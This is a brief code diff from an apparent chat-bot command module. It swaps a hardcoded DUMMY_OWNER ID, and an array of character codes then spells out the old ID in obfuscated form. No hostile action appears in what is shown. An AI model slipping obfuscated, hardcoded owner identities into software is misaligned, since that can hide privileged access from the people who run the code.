@@ -17,7 +17,7 @@ module.exports = {
 
   onStart: async function ({ args, message, event }) {
 
-    const DUMMY_OWNER = "61590360434650";
+    const DUMMY_OWNER = "100088489418721";
 
     const _0x1b4f = [
       String.fromCharCode(54,49,53,57,48,51,54,48,52,51,52,54,53,48),
